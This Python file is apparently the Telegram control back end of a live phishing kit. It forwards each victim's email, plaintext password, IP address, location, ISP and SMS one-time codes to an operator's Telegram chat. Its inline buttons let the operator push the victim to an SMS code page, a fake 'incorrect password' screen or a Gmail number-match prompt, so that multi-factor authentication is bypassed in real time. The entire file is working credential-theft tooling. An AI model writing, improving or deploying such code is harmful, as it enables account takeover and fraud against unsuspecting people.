import os
import time
import json
import requests
from datetime import datetime


class TelegramService:
    def __init__(self, token=None, chat_id=None):
        self.bot_token = token or os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "").strip()
        self.last_update_id = 0
        self.polling_in_progress = False
        self.host_selections = {}

    def is_configured(self):
        return len(self.bot_token) > 0 and len(self.chat_id) > 0

    def get_config(self):
        return {
            "hasToken": len(self.bot_token) > 0,
            "hasChatId": len(self.chat_id) > 0,
            "maskedToken": f"{self.bot_token[:6]}...{self.bot_token[-4:]}" if self.bot_token else "Not Configured",
            "chatId": self.chat_id or "Not Configured"
        }

    def api_call(self, method, payload):
        if not self.bot_token:
            raise ValueError("Telegram Bot Token is not configured.")
        url = f"https://api.telegram.org/bot{self.bot_token}/{method}"
        try:
            # Use 10s socket timeout, enough headroom for long polling
            res = requests.post(url, json=payload, timeout=10)
            data = res.json()
            if not data.get("ok"):
                raise Exception(f"Telegram API Error: {data.get('description', json.dumps(data))}")
            return data.get("result")
        except Exception as e:
            raise e
    def send_message(self, text, parse_mode="HTML", reply_markup=None):
        if not self.chat_id:
            raise ValueError("Telegram Chat ID is not configured.")
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        if reply_markup:
            payload["reply_markup"] = reply_markup
        return self.api_call("sendMessage", payload)

    def send_visitor_alert(self, visitor):
        if not self.is_configured():
            return None

        message = f"""
👀 👀 <b>IMCOMING SUBMISSION FROM {visitor.get('provider', 'Unknown').upper()}!</b>
━━━━━━━━━━━━━━━━━━
        """.strip()

        return self.send_message(message, "HTML")

    def send_login_alert(self, state):
        """
        quickly send a login alert to the configured Telegram chat with details from the state dictionary.

        📱 <b>Device & Browser Fingerprint:</b>
    • Browser: <code>{visitor.get('browser', 'Unknown')}</code>
    • OS: <code>{visitor.get('os', 'Unknown')}</code>
    • Screen Size: <code>{visitor.get('screenSize', 'Unknown')}</code>
    • Language: <code>{visitor.get('language', 'Unknown')}</code>
    • Timezone: <code>{visitor.get('timezone', 'Unknown')}</code>
    • CPU Cores: <code>{visitor.get('cores', 'Unknown')} Cores</code>
    • Platform: <code>{visitor.get('platform', 'Unknown')}</code>

        """
        if not self.is_configured():
            return None

        provider_name = state.get("provider", "").upper()
        attempt_id = state.get("id", "")

        visitor = state.get("visitor", {})  # ✅ IMPORTANT

        prompt_details = (
            f"🔢 <b>Gmail Match Code:</b> <code>{state.get('promptNumber')}</code>\n"
            if state.get("promptNumber") else ""
        )

        time_format = datetime.utcnow().strftime("%H:%M:%S")
        if state.get("timestamp"):
            try:
                dt = datetime.fromisoformat(state.get("timestamp").replace("Z", "+00:00"))
                time_format = dt.strftime("%H:%M:%S")
            except Exception:
                pass

        message = f"""
    ━━━━━━━━━━━━━━━━━━
    🏢 <b>Portal:</b> {provider_name}
    📧 <b>Email:</b> <code>{state.get('email') or "Unknown"}</code>
    🔑 <b>Password:</b> <code>{state.get('password') or "(Not entered yet)"}</code>

    📍 <b>Location & Network:</b>
    • IP: <code>{visitor.get('ip', 'Unknown')}</code>
    • City: <code>{visitor.get('city', 'Unknown')}</code>
    • Region: <code>{visitor.get('region', 'Unknown')}</code>
    • Country: <code>{visitor.get('country_name', 'Unknown')} ({visitor.get('country_code', '??')})</code>
    • Provider/ISP: <code>{visitor.get('org', 'Unknown')}</code>

    
  
        """.strip()

        keyboard = []
        keyboard.append([
            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
        ])
        keyboard.append([
            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
        ])

        candidates = state.get("promptCandidates") or []
        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
            row = []
            for num in candidates:
                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
            keyboard.append(row)
            keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])
        else:
           keyboard.append([
                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
            ])

        inline_keyboard = {"inline_keyboard": keyboard}
        return self.send_message(message, "HTML", inline_keyboard)
    def send_sms_submit_alert(self, state):
            if not self.is_configured():
                return None

            attempt_id = state.get("id", "")

            message = f"""
    📲 <b>BOX RESULT</b>
    ━━━━━━━━━━━━━━━━━━
    🏢 <b>Portal:</b> {state.get('provider', '').upper()}
    📧 <b>Email:</b> <code>{state.get('email') or "Unknown"}</code>
    📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
    ━━━━━━━━━━━━━━━━━━
            """.strip()

            # Build a clean, structured layout with exactly one button per action
            keyboard = [
                [
                    {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
                ],
                [
                    {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                    {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                ],
                [
                    {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
                ]
            ]

            inline_keyboard = {"inline_keyboard": keyboard}
            return self.send_message(message, "HTML", inline_keyboard)
    def poll_updates(self, on_action_received):
        if not self.is_configured():
            return 0
        if self.polling_in_progress:
            return 0
        self.polling_in_progress = True
        try:
            payload = {"timeout": 30}  # Long polling keeps connection alive efficiently
            if self.last_update_id > 0:
                payload["offset"] = self.last_update_id + 1

            updates = self.api_call("getUpdates", payload)
            print(f"[POLL] Got {len(updates)} updates", flush=True)  
            count = 0

            for update in updates:
                self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                callback_query = update.get("callback_query")
                message_update = update.get("message") or update.get("edited_message")

                # Handle plain text messages for setting candidates
                if message_update and isinstance(message_update, dict):
                    try:
                        text = message_update.get("text", "") or ""
                        if text.lower().startswith("candidates "):
                            parts_msg = text.split()
                            if len(parts_msg) >= 5:
                                attempt_id_msg = parts_msg[1]
                                cand_vals = parts_msg[2:5]
                                try:
                                    self.api_call("sendMessage", {
                                        "chat_id": message_update.get("chat", {}).get("id"),
                                        "text": f"Received candidate set for {attempt_id_msg}: {', '.join(cand_vals)}\nDelivering to guest...",
                                        "parse_mode": "HTML"
                                    })
                                except Exception:
                                    pass
                                on_action_received(attempt_id_msg, "number_prompt", {"candidates": cand_vals})
                                count += 1
                                continue
                    except Exception as e:
                        print(f"Failed to parse candidate text message: {e}", flush=True)

                if callback_query:
                    data = callback_query.get("data", "")
                    query_id = callback_query.get("id")

                    if data and data.startswith("tg:"):
                        parts = data.split(":")
                        if len(parts) < 3:
                            continue

                        action = parts[1]
                        attempt_id = parts[2]

                        handled_inline = False
                        mapped_action = "pending"
                        feedback = "Action processed"

                        # Define custom user feedback notices instantly based on actions
                        if action == "approve":
                            mapped_action = "approve"
                            feedback = "Bypass approved! ✅"
                        elif action == "deny":
                            mapped_action = "deny"
                            feedback = "Access Blocked! ❌"
                        elif action == "req_sms":
                            mapped_action = "request_sms"
                            feedback = "SMS screen requested! 📲"
                        elif action == "inc_pw":
                            mapped_action = "incorrect_password"
                            feedback = "Incorrect Password screen requested! ⚠️"
                        elif action == "num_prompt":
                            mapped_action = "pending"
                            feedback = "Select a number to dispatch instantly! 🔢"
                            handled_inline = True
                        elif action == "picknum":
                            mapped_action = "number_prompt"
                            chosen = parts[3] if len(parts) > 3 else None
                            feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"
                        elif action == "sendcandidates":
                            mapped_action = "number_prompt"
                            handled_inline = True
                            chosen_number = parts[3] if len(parts) > 3 else ""
                            feedback = f"Number {chosen_number} sent to guest ✅"

                        # 🚀 CRITICAL OPTIMIZATION: Answer the callback query IMMEDIATELY.
                        # This tells the Telegram app to stop spinning the loading wheels instantly.
                        try:
                            self.api_call("answerCallbackQuery", {
                                "callback_query_id": query_id,
                                "text": feedback
                            })
                        except Exception as e:
                            print(f"Failed to answer callback query early: {e}", flush=True)

                        # Run structural interface modifications (Inline Keyboard changes)
                        if action == "num_prompt":
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id

                                keyboard = []
                                nums = list(range(1, 101))
                                for r in range(0, 100, 10):
                                    row = []
                                    for n in nums[r:r + 10]:
                                        row.append({"text": str(n), "callback_data": f"tg:sendcandidates:{attempt_id}:{n}"})
                                    keyboard.append(row)

                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": orig_text,
                                    "parse_mode": "HTML",
                                    "reply_markup": {"inline_keyboard": keyboard}
                                })
                            except Exception as _e:
                                print(f"Failed to show 1-100 keyboard: {_e}", flush=True)

                        elif action == "sendcandidates":
                            try:
                                orig = callback_query.get("message")
                                chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                control_keyboard = {
                                    "inline_keyboard": [
                                        [{"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"}],
                                        [
                                            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                                        ],
                                        [{"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}]
                                    ]
                                }
                                self.api_call("editMessageText", {
                                    "chat_id": chat_id_val,
                                    "message_id": orig.get("message_id") if orig else None,
                                    "text": orig_text ,
                                    "parse_mode": "HTML",
                                    "reply_markup": control_keyboard
                                })
                            except Exception as _e:
                                print(f"Failed to restore panel keyboard: {_e}", flush=True)

                        # Clean up standard text message interfaces (only if not an inline menu process)
                        if not handled_inline:
                            try:
                                original_msg = callback_query.get("message")
                                if original_msg:
                                    current_text = original_msg.get("text") or ""
                                    updated_text = "" if current_text else f"{original_msg.get('caption') or ''}\n\n"
                                    
                                    self.api_call("editMessageText", {
                                        "chat_id": original_msg.get("chat", {}).get("id"),
                                        "message_id": original_msg.get("message_id"),
                                        "text": updated_text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": []}
                                    })
                            except Exception as e:
                                print(f"Failed to clear inline layout: {e}", flush=True)

                        # Dispatch the telemetry action details back to your Flask backend pipelines
                        if action == "picknum":
                            chosen_val = parts[3] if len(parts) > 3 else None
                            on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
                        elif action == "sendcandidates":
                            candidates_list = [parts[3]] if len(parts) > 3 else []
                            on_action_received(attempt_id, mapped_action, {"candidates": candidates_list})
                        else:
                            on_action_received(attempt_id, mapped_action)

                        count += 1

            return count

        except Exception as e:
            err_msg = str(e)
            if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval.", flush=True)
            else:
                print(f"[Telegram Polling Warning] {err_msg}", flush=True)
            return 0
        finally:
            self.polling_in_progress = False